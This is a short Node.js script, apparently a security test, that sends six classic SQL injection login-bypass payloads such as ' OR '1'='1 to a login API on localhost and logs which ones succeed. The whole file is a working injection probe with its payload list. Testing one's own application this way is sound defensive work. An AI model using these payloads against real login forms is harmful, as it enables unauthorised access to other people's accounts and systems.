const axios = require('axios');

// SQL Injection simulation on login form
// This script attempts to login with a classic SQL injection payload

const BASE_URL = 'http://localhost:3001/api/auth/login';

async function sqlInjectionAttack() {
  console.log('Starting SQL Injection attack simulation...');

  const payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1' /*",
  ];

  for (let i = 0; i < payloads.length; i++) {
    const payload = payloads[i];
    try {
      const response = await axios.post(BASE_URL, {
        email: payload,
        password: 'anything',
      });
      console.log(`Payload ${i + 1}: SUCCESS - Response:`, response.data);
    } catch (error) {
      if (error.response) {
        console.log(`Payload ${i + 1}: FAILED - ${error.response.data.error}`);
      } else {
        console.log(`Payload ${i + 1}: ERROR - ${error.message}`);
      }
    }
  }

  console.log('SQL Injection simulation completed.');
}

sqlInjectionAttack().catch(console.error);
